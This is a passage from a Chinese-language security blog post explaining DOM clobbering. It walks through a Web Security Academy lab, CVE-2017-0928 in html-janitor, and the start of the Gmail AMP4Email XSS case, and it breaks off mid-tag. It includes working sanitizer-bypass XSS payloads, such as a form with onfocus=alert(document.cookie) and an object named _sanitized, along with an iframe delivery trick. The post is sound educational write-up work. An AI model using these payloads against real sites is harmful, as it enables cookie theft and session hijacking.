D5;&#x8FC7;&#xFF1B;&#x5C5E;&#x6027;&#x7684;&#x83B7;&#x53D6;&#x5728;&#x4E00;&#x4E2A;<code>for</code>&#x5FAA;&#x73AF;&#x5F53;&#x4E2D;&#xFF0C;&#x6761;&#x4EF6;&#x662F;<code>node.attributes.length</code>&#xFF0C;&#x83B7;&#x53D6;&#x65B9;&#x5F0F;&#x662F;<code>node.attributes[a]</code>&#xFF0C;&#x8FC7;&#x6EE4;&#x7531;<code>shouldRejectAttr</code>&#x65B9;&#x6CD5;&#x8FDB;&#x884C;&#x3002;</p><p>&#x5BF9; Dom Clobbering &#x6BD4;&#x8F83;&#x654F;&#x611F;&#x7684;&#x540C;&#x5B66;&#x53EF;&#x80FD;&#x4F1A;&#x6CE8;&#x610F;&#x5230;&#x8FD9;&#x91CC;&#xFF0C;&#x5BF9;&#x4E8E; node &#x5C5E;&#x6027;&#x8FC7;&#x6EE4;&#x65F6;&#x7684;<code>for</code>&#x5FAA;&#x73AF;&#x6761;&#x4EF6;&#xFF0C;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x4E86;<code>node.attributes.length</code>&#xFF0C;&#x5018;&#x82E5;&#x6211;&#x4EEC;&#x6784;&#x9020;&#x7684;&#x8282;&#x70B9;&#x6B63;&#x597D;&#x6709;&#x4E00;&#x4E2A;<code>attributes</code>&#x5B50;&#x8282;&#x70B9;&#x4F1A;&#x600E;&#x4E48;&#x6837;&#x5462;&#xFF1F;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">img</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">var</span> node = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(node.attributes);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> a = <span class="hljs-number">0</span>; a &lt; node.attributes.length; a++) {</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">console</span>.log(node.attributes[a]);</span></span><br><span class="line">  }</span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&apos;finished&apos;</span>);</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4EE5;&#x4E0A;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x4F1A;&#x8F93;&#x51FA;&#x4E00;&#x4E2A;<code>NamedNodeMap</code>&#x5BF9;&#x8C61;&#xFF0C;<code>id=&apos;x&apos;</code>&#x4EE5;&#x53CA; finished</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">name</span>=<span class="hljs-string">attributes</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">var</span> node = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(node.attributes);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> a = <span class="hljs-number">0</span>; a &lt; node.attributes.length; a++) {</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">console</span>.log(node.attributes[a]);</span></span><br><span class="line">  }</span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&apos;finished&apos;</span>);</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4EE5;&#x4E0A;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x4F1A;&#x8F93;&#x51FA;<code>&lt;img name=attributes&gt;</code>&#x4EE5;&#x53CA; finished &#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6211;&#x4EEC;&#x4F7F;&#x7528;<code>name=attributes</code>&#x6210;&#x529F;&#x5730;&#x8986;&#x76D6;&#x4E86;&#x539F;&#x6765;&#x7684;<code>node.attributes</code>&#xFF0C;&#x6240;&#x4EE5;<code>node.attributes.length</code>&#x5728;&#x8FD9;&#x91CC;&#x7684;&#x503C;&#x4E3A;<code>undefined</code>&#xFF0C;&#x5E76;&#x4E14;&#x4E5F;&#x6CA1;&#x6709;&#x5F71;&#x54CD; JS &#x4EE3;&#x7801;&#x7684;&#x7EE7;&#x7EED;&#x8FD0;&#x884C;&#x3002;</p><p>&#x6240;&#x4EE5;&#x660E;&#x767D;&#x4E86;&#x8FD9;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x5305;&#x542B;&#x6709;<code>name=attributes</code>&#x7684;&#x5B50;&#x8282;&#x70B9;&#x7684; payload &#x7ED5;&#x8FC7;&#x5C5E;&#x6027;&#x7684; check &#xFF0C;&#x8FD9;&#x91CC;&#x7ED9;&#x5B9A;&#x7684;&#x767D;&#x540D;&#x5355;&#x6807;&#x7B7E;&#x4E5F;&#x6BD4;&#x8F83;&#x660E;&#x663E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; HTML Relationships &#x6765;&#x6784;&#x9020;&#x6211;&#x4EEC;&#x7684; payload</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> &gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">attributes</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x63A5;&#x7740;&#x5C31;&#x662F;&#x6784;&#x9020; XSS &#x4E86;&#xFF0C;&#x6839;&#x636E;&#x9898;&#x76EE;&#x8981;&#x6C42;&#xFF0C;&#x9700;&#x8981;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x89E6;&#x53D1;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>tabindex</code>&#x5C5E;&#x6027;&#xFF0C;&#x914D;&#x5408;<code>form</code>&#x7684;<code>onfocus</code>&#x65F6;&#x95F4;&#x6765; XSS &#x3002;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">0</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">attributes</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x628A;&#x5B83;&#x5F53;&#x4F5C;&#x8BC4;&#x8BBA;&#x63D0;&#x4EA4;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200227152312.png" alt></p><p>&#x4F46;&#x662F;&#x5982;&#x679C;&#x76F4;&#x63A5;&#x4EA4;&#x7ED9;&#x7528;&#x6237;&#x70B9;&#x51FB;&#x7684;&#x8BDD;&#x662F;&#x4E0D;&#x4F1A;&#x89E6;&#x53D1;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x8BC4;&#x8BBA;&#x662F;&#x7531; aJax &#x8BF7;&#x6C42;&#x62FF;&#x5230;&#x7684;&#xFF0C;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x7684;&#x8BDD;&#xFF0C;Dom &#x6811;&#x662F;&#x8FD8;&#x6CA1;&#x6709;&#x8BC4;&#x8BBA;&#x7684;&#xFF0C;&#x5F97;&#x9700;&#x8981;&#x7B49;&#x5F85; JS &#x6267;&#x884C;&#x5B8C;&#x6210;&#x624D;&#x4F1A;&#x6709;&#x8BC4;&#x8BBA;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x5EF6;&#x65F6;&#x6216;&#x8005;&#x963B;&#x585E;&#x7684;&#x64CD;&#x4F5C;&#x3002;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#x7684;&#x662F;&#x5229;&#x7528;<code>iframe</code>&#x8FDB;&#x884C;<code>setTimeout</code></p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">https://your-lab-id.web-security-academy.net/post?postId</span>=<span class="hljs-string">3</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;setTimeout(a=&gt;this.src=this.src+&apos;#x&apos;,500)&quot;</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x8981;&#x6CE8;&#x610F;&#x4E00;&#x5B9A;&#x8981;&#x5F97;&#x7B49;&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5B8C;&#x6BD5;&#x518D;&#x7528;<code>#x</code>&#x9009;&#x62E9;<code>form</code>&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x7684; 500ms &#x9700;&#x8981;&#x6839;&#x636E;&#x81EA;&#x5DF1;&#x7684;&#x7F51;&#x7EDC;&#x60C5;&#x51B5;&#x9002;&#x5F53;&#x8C03;&#x6574;&#x3002;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200227153949.png" alt></p><h3 id="CVE-2017-0928-Bypassing-sanitization-using-DOM-clobbering"><a href="#CVE-2017-0928-Bypassing-sanitization-using-DOM-clobbering" class="headerlink" title="CVE-2017-0928 Bypassing sanitization using DOM clobbering"></a>CVE-2017-0928 Bypassing sanitization using DOM clobbering</h3><p><a href="https://github.com/guardian/html-janitor/" target="_blank" rel="noopener">html-janitor</a> &#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x4E0A;&#x6587;&#x7528;&#x5230;&#x7684; HTML filters&#xFF0C;&#x5728; v2.0.2 &#x5F53;&#x4E2D;&#xFF0C;janitor &#x5728;&#x5FAA;&#x73AF;&#x4E2D;&#x6709;&#x8FD9;&#x4E48;&#x51E0;&#x884C;&#x4EE3;&#x7801;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">do</span> {</span><br><span class="line">  <span class="hljs-comment">// Ignore nodes that have already been sanitized</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (node._sanitized) {</span><br><span class="line">    <span class="hljs-keyword">continue</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line">  <span class="hljs-comment">// Sanitize children</span></span><br><span class="line">  <span class="hljs-keyword">this</span>._sanitize(node);</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-comment">// Mark node as sanitized so it&apos;s ignored in future runs</span></span><br><span class="line">  node._sanitized = <span class="hljs-literal">true</span>;</span><br><span class="line">} <span class="hljs-keyword">while</span> ((node = treeWalker.nextSibling()));</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7528;<code>_sanitized</code>&#x4F5C;&#x4E3A;&#x6807;&#x5FD7;&#x4F4D;&#x6765;&#x6807;&#x5FD7;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x8FDB;&#x884C;&#x6807;&#x51C6;&#x5316;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x91CC;&#xFF0C;&#x7531;&#x6211;&#x4EEC;&#x4E0A;&#x4E2A;&#x4F8B;&#x5B50;&#x53EF;&#x4EE5;&#x5F97;&#x51FA;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x4E0E;&#x4E0A;&#x4E2A;&#x4F8B;&#x5B50;&#x7C7B;&#x4F3C;&#x7684; payload &#x7ED5;&#x8FC7;&#x7B2C;&#x4E00;&#x4E2A; if &#x5C31;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x6807;&#x51C6;&#x5316;&#x8FC7;&#x6EE4;&#x4E86;&#x3002;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">alert(document.domain)</span> <span class="hljs-attr">name</span>=<span class="hljs-string">_sanitized</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4FEE;&#x590D;&#x65B9;&#x6848;&#x662F;&#x5220;&#x9664;&#x4E86;&#x8FD9;&#x4E9B;&#x5224;&#x65AD;&#xFF0C;&#x5BF9;&#x5B50;&#x6811;&#x5229;&#x7528;&#x9012;&#x5F52;&#x5F62;&#x5F0F;&#x8FDB;&#x884C;&#x6807;&#x51C6;&#x5316;&#x8FC7;&#x6EE4;&#x3002;</p><h3 id="XSS-in-GMail&#x2019;s-AMP4Email-via-DOM-Clobbering"><a href="#XSS-in-GMail&#x2019;s-AMP4Email-via-DOM-Clobbering" class="headerlink" title="XSS in GMail&#x2019;s AMP4Email via DOM Clobbering"></a>XSS in GMail&#x2019;s AMP4Email via DOM Clobbering</h3><p>&#x7EC8;&#x4E8E;&#x5230;&#x4E86;&#x6211;&#x4EEC;&#x5F00;&#x5934;&#x63D0;&#x5230;&#x7684; OWASP Top 10 &#x63D0;&#x540D;&#x7684;&#x653B;&#x51FB;&#x5B9E;&#x4F8B;&#x4E86;&#xFF0C;&#x4F5C;&#x8005;&#x9996;&#x5148;&#x901A;&#x8FC7;&#x76F4;&#x63A5;&#x5728;&#x63A7;&#x5236;&#x53F0;&#x8F93;&#x5165; window &#x8FDB;&#x884C; fuzz</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-7.png" alt></p><p>&#x8FD9;&#x91CC;&#x4ED6;&#x9996;&#x5148;&#x5229;&#x7528;&#x4E86;<code>AMP</code>&#xFF0C;&#x5C1D;&#x8BD5;&#x63D2;&#x5165;<code>&lt;a id=AMP&gt;</code>&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x4E2A;<code>AMP</code>&#x88AB; ban &#x4E86;</p><p><img 